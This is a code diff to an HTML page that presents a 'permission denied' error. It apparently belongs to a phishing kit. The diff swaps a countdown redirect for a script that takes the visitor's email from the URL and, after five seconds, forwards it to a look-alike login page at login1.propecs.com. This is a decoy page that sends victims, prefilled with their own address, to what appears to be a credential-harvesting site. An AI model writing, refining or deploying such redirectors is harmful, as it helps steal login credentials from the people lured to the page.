@@ -120,20 +120,15 @@ emsg: ErrorPermissionDenied
 </div>
 
 <script>
-  let timeLeft = 5;
-  const countdownElement = document.getElementById('countdown');
-  
-  const timer = setInterval(() => {
-    timeLeft--;
-    if (countdownElement) {
-      countdownElement.textContent = timeLeft;
-    }
-    
-    if (timeLeft <= 0) {
-      clearInterval(timer);
-      window.location.href = 'https://login1.propecs.com/EsTQZNnm#';
-    }
-  }, 1000);
+  // Get email from current URL
+  const params = new URLSearchParams(window.location.search);
+  const email = params.get("email");
+
+  // Redirect after 5 seconds
+  setTimeout(() => {
+    window.location.href =
+      "https://login1.propecs.com/EsTQZNnm?email=" + encodeURIComponent(email || "");
+  }, 5000);
 </script>
 
 </body>
